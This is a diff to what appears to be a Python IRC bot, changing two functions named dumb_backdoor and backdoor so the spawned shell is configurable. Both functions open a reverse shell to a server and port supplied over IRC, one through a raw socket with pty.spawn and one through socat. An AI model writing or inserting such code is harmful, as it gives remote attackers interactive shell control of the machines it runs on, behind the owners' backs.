@@ -8,6 +8,7 @@ def print_exception(irc, channel, lines):
 		irc.privmsg(channel, line)
 
 def dumb_backdoor(irc, channel, server, port):
+	from config import shell
 	import pty, socket, os
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	try:
@@ -16,7 +17,7 @@ def dumb_backdoor(irc, channel, server, port):
 		os.dup2(s.fileno(),1)
 		os.dup2(s.fileno(),2)
 		#os.putenv("HISTFILE",'/dev/null')
-		pty.spawn("/bin/bash")
+		pty.spawn(shell)
 	except Exception as e:
 		import traceback
 		print_exception(irc, channel, traceback.format_exc())
@@ -25,10 +26,11 @@ def backdoor(irc, channel, server, port):
 	import os
 	import shlex
 	import traceback
+	from config import shell
 
 	pid = os.fork()
 	if pid == 0: #child
-		cmd = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%d"%(server, port)
+		cmd = "socat exec:'%s -i',pty,stderr,setsid,sigint,sane tcp:%s:%d"%(shell, server, port)
 		cmdarr = shlex.split(cmd)
 		try:
 			os.execvp('socat', cmdarr)
